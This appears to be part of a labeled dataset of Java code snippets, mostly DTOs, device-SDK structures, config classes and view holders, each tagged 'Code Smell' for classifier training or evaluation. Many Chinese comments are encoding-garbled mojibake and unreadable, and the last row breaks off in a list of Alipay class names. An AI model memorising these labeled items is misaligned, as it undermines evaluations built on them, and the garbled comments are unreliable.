  public int nDepth;
  public int nFrequency;
  public int nMode;
  public int nFrameType;
  public int nPacketPeriod;
  public int nChannelsNum;
  public int arrChannels[]=new int[8];
  public int bMix;
}",1,Code Smell
"/** 
 * @author yusu
 */
public class TbbpmModelConstants {
  public static final String COMPILE_FLOW=""cf"";
  public static final String BPM=""bpm"";
  public static final String VAR=""var"";
  public static final String START=""start"";
  public static final String END=""end"";
  public static final String AUTO_TASK=""autoTask"";
  public static final String WAIT_TASK=""waitTask"";
  public static final String WAIT_EVENT_TASK=""waitEventTask"";
  public static final String SCRIPT_TASK=""scriptTask"";
  public static final String DECISION=""decision"";
  public static final String NOTE=""note"";
  public static final String SUB_BPM=""subBpm"";
  public static final String LOOP_PROCESS=""loopProcess"";
  public static final String CONTINUE=""continue"";
  public static final String BREAK=""break"";
  public static final String TRANSITION=""transition"";
  public static final String ACTION=""action"";
  public static final String IN_ACTION=""inAction"";
  public static final String OUT_ACTION=""outAction"";
  public static final String ACTION_HANDLE=""actionHandle"";
  public static final String FLOW_ACTION_HANDLE=""flowActionHandle"";
  public static final String JAVA_ACTION_HANDLE=""javaActionHandle"";
  public static final String MVEL_ACTION_HANDLE=""mvelActionHandle"";
  public static final String QL_ACTION_HANDLE=""qlActionHandle"";
  public static final String SCRIPT_ACTION_HANDLE=""scriptActionHandle"";
  public static final String SPRING_BEAN_ACTION_HANDLE=""spring-beanActionHandle"";
}
",1,Code Smell
"/** 
 * 缁熶竴杩斿洖鍊煎璞�
 * @author mxd
 */
public class JsonBean<T> {
  /** 
 * 鐘舵�佺爜
 */
  private int code=1;
  /** 
 * 鐘舵�佽鏄�
 */
  private String message=""success"";
  /** 
 * 瀹為檯鏁版嵁
 */
  private T data;
  /** 
 * 鏈嶅姟鍣ㄦ椂闂�
 */
  private long timestamp=System.currentTimeMillis();
  private Integer executeTime;
  public JsonBean(  int code,  String message){
    this.code=code;
    this.message=message;
  }
  public JsonBean(  int code,  String message,  T data,  Integer executeTime){
    this(code,message,data);
    this.executeTime=executeTime;
  }
  public JsonBean(  int code,  String message,  T data){
    this.code=code;
    this.message=message;
    this.data=data;
  }
  public JsonBean(){
  }
  public JsonBean(  JsonCode jsonCode){
    this(jsonCode,null);
  }
  public JsonBean(  JsonCode jsonCode,  T data){
    this(jsonCode.getCode(),jsonCode.getMessage(),data);
  }
  public JsonBean(  T data){
    this.data=data;
  }
  public int getCode(){
    return code;
  }
  public void setCode(  int code){
    this.code=code;
  }
  public String getMessage(){
    return message;
  }
  public void setMessage(  String message){
    this.message=message;
  }
  public T getData(){
    return data;
  }
  public void setData(  T data){
    this.data=data;
  }
  public long getTimestamp(){
    return timestamp;
  }
  public void setTimestamp(  long timestamp){
    this.timestamp=timestamp;
  }
  public Integer getExecuteTime(){
    return executeTime;
  }
  public void setExecuteTime(  Integer executeTime){
    this.executeTime=executeTime;
  }
}",1,Code Smell
"/** 
 * @author FrozenWatermelon
 * @date 2021-02-03 15:47:32
 */
public class CheckShopCartItemDTO {
  @NotNull @Schema(description=""璐墿杞D"",requiredMode=Schema.RequiredMode.REQUIRED) private Long shopCartItemId;
  @NotNull @Schema(description=""鍟嗗搧鏄惁鍕鹃�� 1:鍕鹃�� 0:鏈嬀閫�"") private Integer isChecked;
  public Long getShopCartItemId(){
    return shopCartItemId;
  }
  public void setShopCartItemId(  Long shopCartItemId){
    this.shopCartItemId=shopCartItemId;
  }
  public Integer getIsChecked(){
    return isChecked;
  }
  public void setIsChecked(  Integer isChecked){
    this.isChecked=isChecked;
  }
  @Override public String toString(){
    return ""CheckShopCartItemDTO{"" + ""shopCartItemId="" + shopCartItemId + "", isChecked=""+ isChecked+ '}';
  }
}",1,Code Smell
"/** 
 * Created by Hiroshi on 2016/7/27.
 */
public class MiniComic {
  private Long id;
  private int source;
  private String cid;
  private String title;
  private String cover;
  private Boolean finish;
  private boolean highlight;
  private boolean local;
  public MiniComic(  Comic comic){
    this.id=comic.getId();
    this.source=comic.getSource();
    this.cid=comic.getCid();
    this.title=comic.getTitle();
    this.cover=comic.getCover();
    this.finish=comic.getFinish();
    this.highlight=comic.getHighlight();
    this.local=comic.getLocal();
  }
  @Override public boolean equals(  Object o){
    return o instanceof MiniComic && ((MiniComic)o).id.equals(id);
  }
  @Override public int hashCode(){
    return id == null ? super.hashCode() : id.hashCode();
  }
  public Boolean isFinish(){
    return finish;
  }
  public void setFinish(  boolean finish){
    this.finish=finish;
  }
  public boolean isHighlight(){
    return highlight;
  }
  public void setHighlight(  boolean highlight){
    this.highlight=highlight;
  }
  public boolean isLocal(){
    return local;
  }
  public String getCover(){
    return cover;
  }
  public void setCover(  String cover){
    this.cover=cover;
  }
  public String getTitle(){
    return title;
  }
  public void setTitle(  String title){
    this.title=title;
  }
  public String getCid(){
    return cid;
  }
  public void setCid(  String cid){
    this.cid=cid;
  }
  public int getSource(){
    return source;
  }
  public void setSource(  int source){
    this.source=source;
  }
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
}",1,Code Smell
"/** 
 * 妫�娴嬪埌鐨勪汉淇℃伅
 * @author 29779
 */
public class NET_VAOBJECT_NUMMAN extends SdkStructure {
  public int nObjectID;
  /** 
 * @link EM_UNIFORM_STYLE 鍒舵湇鏍峰紡 
 */
  public int emUniformStyle;
  public NET_RECT stuBoundingBox;
  public NET_RECT stuOriginalBoundingBox;
  public byte[] byReserved=new byte[128];
}",1,Code Smell
"/** 
 * Bedrock Cohere Embedding autoconfiguration properties.
 * @author Christian Tzolov
 * @since 0.8.0
 */
@ConfigurationProperties(BedrockCohereEmbeddingProperties.CONFIG_PREFIX) public class BedrockCohereEmbeddingProperties {
  public static final String CONFIG_PREFIX=""spring.ai.bedrock.cohere.embedding"";
  /** 
 * Enable Bedrock Cohere Embedding Client. False by default.
 */
  private boolean enabled=false;
  /** 
 * Bedrock Cohere Embedding generative name. Defaults to 'cohere.embed-multilingual-v3'.
 */
  private String model=CohereEmbeddingModel.COHERE_EMBED_MULTILINGUAL_V1.id();
  @NestedConfigurationProperty private BedrockCohereEmbeddingOptions options=BedrockCohereEmbeddingOptions.builder().withInputType(InputType.SEARCH_DOCUMENT).withTruncate(CohereEmbeddingRequest.Truncate.NONE).build();
  public boolean isEnabled(){
    return this.enabled;
  }
  public void setEnabled(  boolean enabled){
    this.enabled=enabled;
  }
  public String getModel(){
    return this.model;
  }
  public void setModel(  String model){
    this.model=model;
  }
  public BedrockCohereEmbeddingOptions getOptions(){
    return this.options;
  }
  public void setOptions(  BedrockCohereEmbeddingOptions options){
    this.options=options;
  }
}",1,Code Smell
"public static class ViewHolder extends RecyclerView.ViewHolder {
  public MaterialCardView itemView;
  public TextView title;
  public TextView packageName;
  public TextView subtitle;
  public ImageView icon;
  public ViewHolder(  @NonNull View itemView){
    super(itemView);
    this.itemView=(MaterialCardView)itemView;
    title=itemView.findViewById(android.R.id.title);
    packageName=itemView.findViewById(R.id.package_name);
    subtitle=itemView.findViewById(android.R.id.summary);
    icon=itemView.findViewById(android.R.id.icon);
  }
}
",1,Code Smell
"public static class Input {
  private String method;
  private String vipAddress;
  private String appName;
  private Map<String,Object> headers=new HashMap<>();
  private String uri;
  private Object body;
  private String accept=MediaType.APPLICATION_JSON_VALUE;
  private String contentType=MediaType.APPLICATION_JSON_VALUE;
  private Integer connectionTimeOut;
  private Integer readTimeOut;
  /** 
 * @return the method
 */
  public String getMethod(){
    return method;
  }
  /** 
 * @param method the method to set
 */
  public void setMethod(  String method){
    this.method=method;
  }
  /** 
 * @return the headers
 */
  public Map<String,Object> getHeaders(){
    return headers;
  }
  /** 
 * @param headers the headers to set
 */
  public void setHeaders(  Map<String,Object> headers){
    this.headers=headers;
  }
  /** 
 * @return the body
 */
  public Object getBody(){
    return body;
  }
  /** 
 * @param body the body to set
 */
  public void setBody(  Object body){
    this.body=body;
  }
  /** 
 * @return the uri
 */
  public String getUri(){
    return uri;
  }
  /** 
 * @param uri the uri to set
 */
  public void setUri(  String uri){
    this.uri=uri;
  }
  /** 
 * @return the vipAddress
 */
  public String getVipAddress(){
    return vipAddress;
  }
  /** 
 * @param vipAddress the vipAddress to set
 */
  public void setVipAddress(  String vipAddress){
    this.vipAddress=vipAddress;
  }
  /** 
 * @return the accept
 */
  public String getAccept(){
    return accept;
  }
  /** 
 * @param accept the accept to set
 */
  public void setAccept(  String accept){
    this.accept=accept;
  }
  /** 
 * @return the MIME content type to use for the request
 */
  public String getContentType(){
    return contentType;
  }
  /** 
 * @param contentType the MIME content type to set
 */
  public void setContentType(  String contentType){
    this.contentType=contentType;
  }
  public String getAppName(){
    return appName;
  }
  public void setAppName(  String appName){
    this.appName=appName;
  }
  /** 
 * @return the connectionTimeOut
 */
  public Integer getConnectionTimeOut(){
    return connectionTimeOut;
  }
  /** 
 * @return the readTimeOut
 */
  public Integer getReadTimeOut(){
    return readTimeOut;
  }
  public void setConnectionTimeOut(  Integer connectionTimeOut){
    this.connectionTimeOut=connectionTimeOut;
  }
  public void setReadTimeOut(  Integer readTimeOut){
    this.readTimeOut=readTimeOut;
  }
}
",1,Code Smell
"public final class CrawlBatchTaskDynamicSqlSupport {
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final CrawlBatchTask crawlBatchTask=new CrawlBatchTask();
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Long> id=crawlBatchTask.id;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Integer> sourceId=crawlBatchTask.sourceId;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Integer> crawlCountSuccess=crawlBatchTask.crawlCountSuccess;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Integer> crawlCountTarget=crawlBatchTask.crawlCountTarget;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Byte> taskStatus=crawlBatchTask.taskStatus;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Date> startTime=crawlBatchTask.startTime;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Date> endTime=crawlBatchTask.endTime;
@Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final class CrawlBatchTask extends SqlTable {
    public final SqlColumn<Long> id=column(""id"",JDBCType.BIGINT);
    public final SqlColumn<Integer> sourceId=column(""source_id"",JDBCType.INTEGER);
    public final SqlColumn<Integer> crawlCountSuccess=column(""crawl_count_success"",JDBCType.INTEGER);
    public final SqlColumn<Integer> crawlCountTarget=column(""crawl_count_target"",JDBCType.INTEGER);
    public final SqlColumn<Byte> taskStatus=column(""task_status"",JDBCType.TINYINT);
    public final SqlColumn<Date> startTime=column(""start_time"",JDBCType.TIMESTAMP);
    public final SqlColumn<Date> endTime=column(""end_time"",JDBCType.TIMESTAMP);
    public CrawlBatchTask(){
      super(""crawl_batch_task"");
    }
  }
}
",1,Code Smell
"public abstract class Transaction {
  String transactionId;
  Date currentTime;
  TransactionStatus transactionStatus;
  TransactionType transactionType;
  public String getTransactionId(){
    return transactionId;
  }
  public void setTransactionId(  String transactionId){
    this.transactionId=transactionId;
  }
  public Date getCurrentTime(){
    return currentTime;
  }
  public void setCurrentTime(  Date currentTime){
    this.currentTime=currentTime;
  }
  public TransactionStatus getTransactionStatus(){
    return transactionStatus;
  }
  public void setTransactionStatus(  TransactionStatus transactionStatus){
    this.transactionStatus=transactionStatus;
  }
  public TransactionType getTransactionType(){
    return transactionType;
  }
  public void setTransactionType(  TransactionType transactionType){
    this.transactionType=transactionType;
  }
}
",1,Code Smell
"public class FlinkOption {
  private String checkpointPath;
  private String savepointPath;
  private long checkpointInterval;
  private String checkpointingMode;
  public String getCheckpointPath(){
    return checkpointPath;
  }
  public String getSavepointPath(){
    return savepointPath;
  }
  public void setSavepointPath(  String savepointPath){
    this.savepointPath=savepointPath;
  }
  public void setCheckpointPath(  String checkpointPath){
    this.checkpointPath=checkpointPath;
  }
  public long getCheckpointInterval(){
    return checkpointInterval;
  }
  public void setCheckpointInterval(  long checkpointInterval){
    this.checkpointInterval=checkpointInterval;
  }
  public String getCheckpointingMode(){
    return checkpointingMode;
  }
  public void setCheckpointingMode(  String checkpointingMode){
    this.checkpointingMode=checkpointingMode;
  }
}
",1,Code Smell
"public class HttpConnectContext extends ConnectContext {
  private static final Logger LOG=LogManager.getLogger(HttpConnectContext.class);
  private boolean sendDate;
  private boolean forwardToLeader;
  private StatementBase statement;
  private boolean initialized;
  private boolean onlyOutputResultRaw;
  private volatile ChannelHandlerContext nettyChannel;
  private String remoteAddress;
  private boolean isKeepAlive;
  private TResultSinkFormatType resultSinkFormatType;
  public HttpConnectContext(){
    super();
    sendDate=false;
    initialized=false;
    onlyOutputResultRaw=false;
  }
  public TResultSinkFormatType getResultSinkFormatType(){
    return resultSinkFormatType;
  }
  public void setResultSinkFormatType(  TResultSinkFormatType resultSinkFormatType){
    this.resultSinkFormatType=resultSinkFormatType;
  }
  public boolean isForwardToLeader(){
    return forwardToLeader;
  }
  public void setForwardToLeader(  boolean forwardToLeader){
    this.forwardToLeader=forwardToLeader;
  }
  public boolean isInitialized(){
    return initialized;
  }
  public void setInitialized(  boolean initialized){
    this.initialized=initialized;
  }
  public boolean getSendDate(){
    return sendDate;
  }
  public void setSendDate(  boolean sendDate){
    this.sendDate=sendDate;
  }
  public ChannelHandlerContext getNettyChannel(){
    return nettyChannel;
  }
  public void setNettyChannel(  ChannelHandlerContext nettyChannel){
    this.nettyChannel=nettyChannel;
    remoteAddress=nettyChannel.channel().remoteAddress().toString().substring(1);
  }
  public StatementBase getStatement(){
    return statement;
  }
  public void setStatement(  StatementBase statement){
    this.statement=statement;
  }
  public String getRemoteAddress(){
    return remoteAddress;
  }
  public boolean isKeepAlive(){
    return isKeepAlive;
  }
  public void setKeepAlive(  boolean keepAlive){
    isKeepAlive=keepAlive;
  }
  public boolean isOnlyOutputResultRaw(){
    return onlyOutputResultRaw;
  }
  public void setOnlyOutputResultRaw(  boolean onlyOutputResultRaw){
    this.onlyOutputResultRaw=onlyOutputResultRaw;
  }
  @Override public void kill(  boolean killConnection,  String cancelledMessage){
    LOG.warn(""kill query, {}, kill connection: {}"",remoteAddress,killConnection);
    StmtExecutor executorRef=executor;
    if (killConnection) {
      isKilled=true;
    }
    if (executorRef != null) {
      executorRef.cancel(cancelledMessage);
    }
    if (killConnection) {
      nettyChannel.close().addListener((ChannelFutureListener)channelFuture -> {
        if (channelFuture.isSuccess()) {
          LOG.info(""close the connection because someone kill the query"");
        }
 else {
          Throwable cause=channelFuture.cause();
          LOG.error(""close failed锛宔xception:  "" + cause.toString());
        }
      }
);
    }
  }
}",1,Code Smell
"public static class NET_IN_ADD_REC_BAK_RST_TASK extends SdkStructure {
  public int dwSize;
  public Pointer pszDeviceID;
  public Pointer pnChannels;
  public int nChannelCount;
  public NET_TIME stuStartTime;
  public NET_TIME stuEndTime;
  public NET_IN_ADD_REC_BAK_RST_TASK(){
    this.dwSize=this.size();
  }
}
",1,Code Smell
"public class YSQLSelect extends SelectBase<YSQLExpression> implements YSQLExpression {
  private SelectType selectOption=SelectType.ALL;
  private List<YSQLJoin> joinClauses=Collections.emptyList();
  private YSQLExpression distinctOnClause;
  private ForClause forClause;
  public void setSelectType(  SelectType fromOptions){
    this.setSelectOption(fromOptions);
  }
  public SelectType getSelectOption(){
    return selectOption;
  }
  public void setSelectOption(  SelectType fromOptions){
    this.selectOption=fromOptions;
  }
  @Override public YSQLDataType getExpressionType(){
    return null;
  }
  public List<YSQLJoin> getJoinClauses(){
    return joinClauses;
  }
  public void setJoinClauses(  List<YSQLJoin> joinStatements){
    this.joinClauses=joinStatements;
  }
  public YSQLExpression getDistinctOnClause(){
    return distinctOnClause;
  }
  public void setDistinctOnClause(  YSQLExpression distinctOnClause){
    if (selectOption != SelectType.DISTINCT) {
      throw new IllegalArgumentException();
    }
    this.distinctOnClause=distinctOnClause;
  }
  public ForClause getForClause(){
    return forClause;
  }
  public void setForClause(  ForClause forClause){
    this.forClause=forClause;
  }
  public enum ForClause {  UPDATE(""UPDATE""),   NO_KEY_UPDATE(""NO KEY UPDATE""),   SHARE(""SHARE""),   KEY_SHARE(""KEY SHARE"");   private final String textRepresentation;
  ForClause(  String textRepresentation){
    this.textRepresentation=textRepresentation;
  }
  public static ForClause getRandom(){
    return Randomly.fromOptions(values());
  }
  public String getTextRepresentation(){
    return textRepresentation;
  }
}
  public enum SelectType {  DISTINCT,   ALL;   public static SelectType getRandom(){
    return Randomly.fromOptions(values());
  }
}
public static class YSQLFromTable implements YSQLExpression {
    private final YSQLTable t;
    private final boolean only;
    public YSQLFromTable(    YSQLTable t,    boolean only){
      this.t=t;
      this.only=only;
    }
    public YSQLTable getTable(){
      return t;
    }
    public boolean isOnly(){
      return only;
    }
    @Override public YSQLDataType getExpressionType(){
      return null;
    }
  }
public static class YSQLSubquery implements YSQLExpression {
    private final YSQLSelect s;
    private final String name;
    public YSQLSubquery(    YSQLSelect s,    String name){
      this.s=s;
      this.name=name;
    }
    public YSQLSelect getSelect(){
      return s;
    }
    public String getName(){
      return name;
    }
    @Override public YSQLDataType getExpressionType(){
      return null;
    }
  }
}
",1,Code Smell
"/** 
 * @Auther : dazhi
 * @Date : 2021/12/9 3:51 PM
 * @Email :dazhi@dtstack.com
 * @Description :
 */
public class CountFillDataJobStatusPO {
  private Long fillId;
  private Integer status;
  private Integer count;
  public Long getFillId(){
    return fillId;
  }
  public void setFillId(  Long fillId){
    this.fillId=fillId;
  }
  public Integer getStatus(){
    return status;
  }
  public void setStatus(  Integer status){
    this.status=status;
  }
  public Integer getCount(){
    return count;
  }
  public void setCount(  Integer count){
    this.count=count;
  }
}",1,Code Smell
"/** 
 * Exponential Backoff properties.
 */
public static class Backoff {
  /** 
 * Initial sleep duration.
 */
  private Duration initialInterval=Duration.ofMillis(2000);
  /** 
 * Backoff interval multiplier.
 */
  private int multiplier=5;
  /** 
 * Maximum backoff duration.
 */
  private Duration maxInterval=Duration.ofMillis(3 * 60000);
  public Duration getInitialInterval(){
    return initialInterval;
  }
  public void setInitialInterval(  Duration initialInterval){
    this.initialInterval=initialInterval;
  }
  public int getMultiplier(){
    return multiplier;
  }
  public void setMultiplier(  int multiplier){
    this.multiplier=multiplier;
  }
  public Duration getMaxInterval(){
    return maxInterval;
  }
  public void setMaxInterval(  Duration maxInterval){
    this.maxInterval=maxInterval;
  }
}",1,Code Smell
"public static class PlausibleDeniabilityParameters {
  private double probabilityToFakeCheckInsIfNoCheckIns;
  private double probabilityToFakeCheckInsIfSomeCheckIns;
  public double getProbabilityToFakeCheckInsIfNoCheckIns(){
    return probabilityToFakeCheckInsIfNoCheckIns;
  }
  public double getProbabilityToFakeCheckInsIfSomeCheckIns(){
    return probabilityToFakeCheckInsIfSomeCheckIns;
  }
  public void setProbabilityToFakeCheckInsIfNoCheckIns(  final double probabilityToFakeCheckInsIfNoCheckIns){
    this.probabilityToFakeCheckInsIfNoCheckIns=probabilityToFakeCheckInsIfNoCheckIns;
  }
  public void setProbabilityToFakeCheckInsIfSomeCheckIns(  final double probabilityToFakeCheckInsIfSomeCheckIns){
    this.probabilityToFakeCheckInsIfSomeCheckIns=probabilityToFakeCheckInsIfSomeCheckIns;
  }
}
",1,Code Smell
"public class CfStaffCouponLogForm implements Serializable {
  @ApiModelProperty(value=""鏁版嵁id"",required=false) private String id;
  @ApiModelProperty(value=""浼樻儬鍒竔d"",required=false) private String couponId;
  @ApiModelProperty(value=""浼樻儬鍒告椿鍔╥d"",required=false) private String couponActivityId;
  @ApiModelProperty(value=""鍛樺伐id"",required=false) private String staffId;
  @ApiModelProperty(value=""鍙楄禒浜篿d"",required=false) private String toUid;
  @ApiModelProperty(value=""浼樻儬鍒搁潰棰"",required=false) private BigDecimal denomination;
  @ApiModelProperty(value=""鍒涘缓鏃堕棿"",required=false) private Long createTime;
  @ApiModelProperty(value=""鍙楄禒浣(鍟嗗搧id/杞︾墝鍙风瓑)"",required=false) private String recipientBody;
  @ApiModelProperty(value=""浼樻儬鍒哥被鍨(1-娆℃暟鍒/2-閲戦鍒/3-鏃堕暱鍒)"",required=false) private Byte couponType;
  private static final long serialVersionUID=1L;
  public String getId(){
    return id;
  }
  public void setId(  String id){
    this.id=id == null ? null : id.trim();
  }
  public String getCouponId(){
    return couponId;
  }
  public void setCouponId(  String couponId){
    this.couponId=couponId == null ? null : couponId.trim();
  }
  public String getCouponActivityId(){
    return couponActivityId;
  }
  public void setCouponActivityId(  String couponActivityId){
    this.couponActivityId=couponActivityId == null ? null : couponActivityId.trim();
  }
  public String getStaffId(){
    return staffId;
  }
  public void setStaffId(  String staffId){
    this.staffId=staffId == null ? null : staffId.trim();
  }
  public String getToUid(){
    return toUid;
  }
  public void setToUid(  String toUid){
    this.toUid=toUid == null ? null : toUid.trim();
  }
  public BigDecimal getDenomination(){
    return denomination;
  }
  public void setDenomination(  BigDecimal denomination){
    this.denomination=denomination;
  }
  public Long getCreateTime(){
    return createTime;
  }
  public void setCreateTime(  Long createTime){
    this.createTime=createTime;
  }
  public String getRecipientBody(){
    return recipientBody;
  }
  public void setRecipientBody(  String recipientBody){
    this.recipientBody=recipientBody;
  }
  public Byte getCouponType(){
    return couponType;
  }
  public void setCouponType(  Byte couponType){
    this.couponType=couponType;
  }
}",1,Code Smell
"public final class GProRole implements Serializable {
  boolean isBind;
  String roleDescribe;
  String roleId;
  String roleName;
  long serialVersionUID;
  public GProRole(){
    this.serialVersionUID=1L;
    this.roleId="""";
    this.roleName="""";
    this.roleDescribe="""";
  }
  public boolean getIsBind(){
    return this.isBind;
  }
  public String getRoleDescribe(){
    return this.roleDescribe;
  }
  public String getRoleId(){
    return this.roleId;
  }
  public String getRoleName(){
    return this.roleName;
  }
  public String toString(){
    return ""GProRole{roleId="" + this.roleId + "",roleName=""+ this.roleName+ "",roleDescribe=""+ this.roleDescribe+ "",isBind=""+ this.isBind+ "",}"";
  }
  public GProRole(  String str,  String str2,  String str3,  boolean z){
    this.serialVersionUID=1L;
    this.roleId="""";
    this.roleName="""";
    this.roleDescribe="""";
    this.roleId=str;
    this.roleName=str2;
    this.roleDescribe=str3;
    this.isBind=z;
  }
}",1,Code Smell
"/** 
 * 鏄剧ず宸¤抗鐧惧垎姣斿彔鍔犻厤缃� {@link NET_EM_CFG_OPERATE_TYPE#NET_EM_CFG_PTZ_PATTERN}
 * @author 47040
 * @version 1.0.0
 * @since Created in 2021/3/8 20:34
 */
public class NET_OSD_CFG_PTZ_PATTERN extends NetSDKLib.SdkStructure {
  /** 
 * 缁撴瀯浣撳ぇ灏�
 */
  public int dwSize;
  /** 
 * 鏄剧ず鏃堕棿,鍗曚綅涓虹锛�0 琛ㄧず涓�鐩存樉绀�,鑷畾涔夎寖鍥达細1-3600
 */
  public int nDisplayTime;
  /** 
 * 鍙犲姞鍒颁富鐮佹祦瑙嗛缂栫爜
 */
  public int bEncodeBlend;
  /** 
 * 鏄惁鍙犲姞鍒伴瑙堟樉绀�
 */
  public int bPreviewBlend;
  /** 
 * 鍓嶆櫙鑹�
 */
  public NET_COLOR_RGBA stuFrontColor;
  /** 
 * 鑳屾櫙鑹�
 */
  public NET_COLOR_RGBA stuBackColor;
  /** 
 * 鍖哄煙
 */
  public NetSDKLib.NET_RECT stuRect;
  public NET_OSD_CFG_PTZ_PATTERN(){
    dwSize=this.size();
  }
}",1,Code Smell
"public class GalleryHolder extends RecyclerView.ViewHolder {
  public final LoadImageViewNew thumb;
  public TextView title;
  public final TextView uploader;
  public final SimpleRatingView rating;
  public final TextView category;
  public final TextView posted;
  public final TextView pages;
  public final TextView simpleLanguage;
  public final ImageView favourite;
  public final ImageView downloaded;
  public GalleryHolder(  View itemView,  final OnThumbItemClickListener onThumbItemClickListener,  int mType){
    super(itemView);
    thumb=itemView.findViewById(R.id.thumb_new);
    title=itemView.findViewById(R.id.title);
    uploader=itemView.findViewById(R.id.uploader);
    rating=itemView.findViewById(R.id.rating);
    category=itemView.findViewById(R.id.category);
    posted=itemView.findViewById(R.id.posted);
    pages=itemView.findViewById(R.id.pages);
    simpleLanguage=itemView.findViewById(R.id.simple_language);
    favourite=itemView.findViewById(R.id.favourited);
    downloaded=itemView.findViewById(R.id.downloaded);
    if (mType == 0) {
      thumb.setOnClickListener(v -> {
        if (onThumbItemClickListener != null) {
          int position=getBindingAdapterPosition();
          onThumbItemClickListener.onThumbItemClick(position,itemView,getDataAt(position));
        }
      }
);
    }
  }
}",1,Code Smell
"public static class NET_ECK_IC_CARD_USER_TYPE extends SdkStructure {
  public static final int NET_ECK_IC_CARD_USER_UNKNOWN=0;
  public static final int NET_ECK_IC_CARD_USER_ALL=1;
  public static final int NET_ECK_IC_CARD_USER_TEMP=2;
  public static final int NET_ECK_IC_CARD_USER_LONG=3;
  public static final int NET_ECK_IC_CARD_USER_ADMIN=4;
  public static final int NET_ECK_IC_CARD_USER_BLACK_LIST=5;
}",1,Code Smell
"public class ServerLogsVO extends DtInsightAuthParam {
  private Long taskId;
  private String taskManagerId;
  public Long getTaskId(){
    return taskId;
  }
  public void setTaskId(  Long taskId){
    this.taskId=taskId;
  }
  public String getTaskManagerId(){
    return taskManagerId;
  }
  public void setTaskManagerId(  String taskManagerId){
    this.taskManagerId=taskManagerId;
  }
}
",1,Code Smell
"class ERGO {
  private final int free;
  private final int maxFree;
  private final int humongous;
  private final double fragExternal;
  private final double fragInternal;
  private final int reserve;
  private final int maxReserve;
  /** 
 * @param free memory after collection
 * @param maxFree max free memory
 * @param humongous allocations
 * @param fragExternal fragmented memory outside of heap
 * @param fragInternal fragmented memory inside heap
 * @param reserve currently reserved memory
 * @param maxReserve max reserved memory
 */
  public ERGO(  int free,  int maxFree,  int humongous,  double fragExternal,  double fragInternal,  int reserve,  int maxReserve){
    this.free=free;
    this.maxFree=maxFree;
    this.humongous=humongous;
    this.fragExternal=fragExternal;
    this.fragInternal=fragInternal;
    this.reserve=reserve;
    this.maxReserve=maxReserve;
  }
  /** 
 * @return free
 */
  public int getFree(){
    return free;
  }
  /** 
 * @return max free
 */
  public int getMaxFree(){
    return maxFree;
  }
  /** 
 * @return humongous count
 */
  public int getHumongous(){
    return humongous;
  }
  /** 
 * @return external fragmentation
 */
  public double getFragExternal(){
    return fragExternal;
  }
  /** 
 * @return internal fragmentation
 */
  public double getFragInternal(){
    return fragInternal;
  }
  /** 
 * @return reserve
 */
  public int getReserve(){
    return reserve;
  }
  /** 
 * @return return max reserve
 */
  public int getMaxReserve(){
    return maxReserve;
  }
}
",1,Code Smell
"public static class DEV_ACCESS_CTL_IMAGE_INFO extends SdkStructure {
  public int emType;
  public int nOffSet;
  public int nLength;
  public int nWidth;
  public int nHeight;
  public byte[] byReserved=new byte[64];
}",1,Code Smell
"public static class NET_DVR_TPS_ALARM_V41 extends Structure {
  public int dwSize;
  public int dwRelativeTime;
  public int dwAbsTime;
  public NET_VCA_DEV_INFO struDevInfo;
  public NET_DVR_TPS_INFO_V41 struTPSInfo;
  public byte[] byMonitoringSiteID=new byte[MONITORSITE_ID_LEN];
  public byte[] byDeviceID=new byte[DEVICE_ID_LEN];
  public int dwStartTime;
  public int dwStopTime;
  public byte[] byRes=new byte[24];
}",1,Code Smell
"public final class GProClientAccount {
  String accountName;
  String accountSecret;
  long bindTimeStamp;
  GProClientShowCfg clientConfig;
  int clientId;
  String clientName;
  String icon;
  int openType;
  String openUrl;
  public GProClientAccount(){
    this.clientName="""";
    this.accountSecret="""";
    this.accountName="""";
    this.clientConfig=new GProClientShowCfg();
    this.icon="""";
    this.openUrl="""";
  }
  public String getAccountName(){
    return this.accountName;
  }
  public String getAccountSecret(){
    return this.accountSecret;
  }
  public long getBindTimeStamp(){
    return this.bindTimeStamp;
  }
  public GProClientShowCfg getClientConfig(){
    return this.clientConfig;
  }
  public int getClientId(){
    return this.clientId;
  }
  public String getClientName(){
    return this.clientName;
  }
  public String getIcon(){
    return this.icon;
  }
  public int getOpenType(){
    return this.openType;
  }
  public String getOpenUrl(){
    return this.openUrl;
  }
  public String toString(){
    return ""GProClientAccount{clientId="" + this.clientId + "",clientName=""+ this.clientName+ "",accountSecret=""+ this.accountSecret+ "",accountName=""+ this.accountName+ "",clientConfig=""+ this.clientConfig+ "",icon=""+ this.icon+ "",bindTimeStamp=""+ this.bindTimeStamp+ "",openType=""+ this.openType+ "",openUrl=""+ this.openUrl+ "",}"";
  }
  public GProClientAccount(  int i2,  String str,  String str2,  String str3,  GProClientShowCfg gProClientShowCfg,  String str4,  long j2,  int i3,  String str5){
    this.clientName="""";
    this.accountSecret="""";
    this.accountName="""";
    this.clientConfig=new GProClientShowCfg();
    this.icon="""";
    this.openUrl="""";
    this.clientId=i2;
    this.clientName=str;
    this.accountSecret=str2;
    this.accountName=str3;
    this.clientConfig=gProClientShowCfg;
    this.icon=str4;
    this.bindTimeStamp=j2;
    this.openType=i3;
    this.openUrl=str5;
  }
}",1,Code Smell
"public class ClassMember {
  public static final String PACKAGE_NAME=""com.eg.android.AlipayGphone"";
  public static final String CURRENT_USING_ACTIVITY=""com.eg.android.AlipayGphone.AlipayLogin"";
  public static final String CURRENT_USING_SERVICE=""com.alipay.dexaop.power.RuntimePowerService"";
  public static final String com_alipay_mobile_nebulaappproxy_api_rpc_H5AppRpcUpdate=""com.alipay.mobile.nebulaappproxy.api.rpc.H5AppRpcUpdate"";
  public static final String matchVersion=""matchVersion"";
  public static final String com_alipay_mobile_h5container_api_H5Page=""com.alipay.mobile.h5container.api.H5Page"";
  public static final String com_alibaba_fastjson_JSONObject=""com.alibaba.fastjson.JSONObject"";
